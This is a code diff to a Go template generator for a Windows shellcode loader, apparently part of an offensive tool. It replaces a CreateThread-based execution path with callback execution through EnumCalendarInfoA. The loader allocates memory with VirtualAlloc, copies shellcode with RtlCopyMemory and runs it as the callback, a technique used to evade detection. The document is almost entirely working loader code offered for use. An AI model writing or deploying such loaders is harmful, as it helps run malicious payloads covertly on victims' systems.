@@ -4,7 +4,7 @@ import (
 	"fmt"
 )
 
-func GetCreateThreadTemplate(targetProcess string) string {
+func GetCallbackTemplate(targetProcess string) string {
 	var _ = targetProcess // unused in this template
 
 	println("\n\n[!] PLEASE NOTE: shellcode will not be injected into new process with this method")
@@ -26,11 +26,13 @@ var (
 	kernel32        = syscall.MustLoadDLL("kernel32.dll")
 	ntdll           = syscall.MustLoadDLL("ntdll.dll")
 
-    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
 	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
-	CreateThread        = kernel32.MustFindProc("CreateThread")
+	EnumCalendarInfoA        = kernel32.MustFindProc("EnumCalendarInfoA")
+	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
 
-    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
+	LOCALE_USER_DEFAULT = 0x0400
+	ENUM_ALL_CALENDARS = 0xFFFFFFFF
+	CAL_SMONTHNAME1 = 0x00000015
 )
 
 func ExecuteOrderSixtySix(shellcode []byte) {
@@ -47,19 +49,12 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 		uintptr(len(shellcode)),
 	)
 
-    threadAddr, _, _ := CreateThread.Call(
-		0,
-		0,
+	_, _, _ = EnumCalendarInfoA.Call(
 		addr,
-		0,
-		0,
-		0,
+		(uintptr)(LOCALE_USER_DEFAULT),
+		(uintptr)(ENUM_ALL_CALENDARS),
+		(uintptr)(CAL_SMONTHNAME1),
 	)
-
-    WaitForSingleObject.Call(
-        threadAddr,
-        0xFFFFFFFF,
-    )
 }
     `)
 }
